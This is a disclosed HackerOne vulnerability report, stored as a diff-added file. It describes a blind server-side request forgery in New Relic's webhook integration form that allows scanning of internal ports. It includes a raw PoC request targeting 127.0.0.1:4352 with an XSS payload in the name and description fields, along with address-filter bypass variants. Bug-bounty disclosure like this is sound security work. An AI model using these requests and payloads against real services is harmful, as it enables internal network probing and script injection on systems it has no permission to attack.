@@ -1,0 +1,40 @@
+ReportLink:https://hackerone.com/reports/263169
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/tungpun
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.10.2017 13:08:21
+
+Summary:
+
+## Introduction:
+
+I found a Blind SSRF issue that allows scanning internal ports.
+
+## How to reproduce:
+
+* Go to 
+`https://rpm.newrelic.com/accounts/<acc_id>/notification_channels?type=WebhookIntegration`
+{F215718}
+
+* Fill the input. In the web hook URL section, fill: `http://<internal_hostname>:<port>/`.
+
+* Send the request.
+
+Look up the response. If valid, it will return status code 200, or 422 for otherwise.
+For demonstration, I try scanning the `localhost` with a limited port range, then found an available port `4352`.
+
+And here is the PoC:
+
+```
+POST /accounts/1723471/notification_channels?type=WebhookIntegration HTTP/1.1
+
+utf8=%E2%9C%93&authenticity_token=i%2FxIU01NWUoCx92w1%2FmilEwulU1SjUGSKsJR8ARB4CQ%3D&webhook_integration%5Bname%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&webhook_integration%5Bwebhook_url%5D=http://127.0.0.1:4352/&webhook_integration%5Bdescription%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E&webhook_integration%5Bverbosity%5D=default&webhook_integration%5Benabled%5D=true
+```
+
+As the filter does not validate the input, it allows the attacker to make the GET request to the internal network.
+I tried replacing `http://127.0.0.1:4352/` by `http://0:4352/` and `http://127.0.0.1:4352/?test=aaaaaaa`, it still works.
+
+In conclusion, I think internal addresses should not be allowed.
